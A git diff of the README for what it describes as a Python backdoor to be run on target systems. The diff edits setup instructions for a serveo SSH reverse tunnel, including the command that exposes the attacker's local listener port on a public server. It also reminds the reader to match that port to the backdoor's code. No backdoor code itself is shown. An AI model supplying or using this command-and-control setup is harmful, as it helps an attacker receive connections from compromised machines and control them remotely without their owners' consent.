@@ -16,14 +16,14 @@ This project is a Python-based backdoor that is to be executed on target system,
   - Continue the installation with default settings after this.
  
  ## SSH Server setup (serveo)
-  As mentioned already In order to receive connections from a public network we must have a public server capable of doing these things, for that 'serveo' is the best option.
+  As mentioned already In order to receive connections from a public network we must have a public server capable of doing these things, for that 'serveo' is the best option. (it's an open source project )
   - you can visit 'https://serveo.net' for more knowledge
   
   ```powershell
   ssh -R 61732:localhost:5555 serveo.net
   ```
  ![ssh](https://github.com/user-attachments/assets/5308fea9-6efd-4d16-81d9-fc1b6b8d749f)
-  - This command will connect port 5555 on our local machine to port 61732 , any TCP port between range (49152–65535) will work, change the port no if not available.
+  - This command will connect port 5555 on our local machine to port 61732 on the public server 'serveo' , any TCP port between range (49152–65535) will work, change the port no if not available.
   - ***Make sure the port number here (in this case 61732) is same as the port number on python code***
 
  ### REMINDER: you should keep a terminal open running this ssh command in order for this to work
